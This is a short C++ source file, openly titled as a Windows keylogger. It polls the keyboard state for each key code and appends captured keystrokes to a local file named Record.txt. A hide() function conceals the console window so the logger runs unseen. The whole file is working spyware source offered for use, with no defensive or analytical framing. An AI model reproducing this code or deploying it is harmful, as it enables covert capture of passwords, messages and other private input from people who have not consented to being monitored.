//============================================================================
// Name        : keylogger.cpp
// Author      : Pelayo Jose Lluna Gonzalez
// Version     : 1.0.0
// Copyright   : License Apache 2
// Description : Keylogger in C++, Ansi-style
//============================================================================

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void log() {
	char key;

	while (true) {
		for (key = 8; key <= 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				ofstream write("Record.txt", ios::app);

				switch (key) {
				case 27:
					write << "<ESC>";
					break;
				case VK_SPACE:
					write << " ";
					break;
				case VK_RETURN:
					write << "\n";
					break;
				case VK_TAB:
					write << "<TAB>";
					break;
				case VK_BACK:
					write << "<BACKSPACE>";
					break;
				default:
					if (((key > 64) && (key < 91)) // upper case letters
							&& !(GetAsyncKeyState(0x10))) {
						key += 32;
						write << key;
					} else if ((key > 64) && (key < 91)) { //lower case letters
						write << key;
					} else if((key > 47) && (key < 58)) { //numbers
						write << key;
					}
					break;
				}

				write.close();
			}
		}
	}
}

void hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

int main() {
	hide();
	log();
	return 0;
}
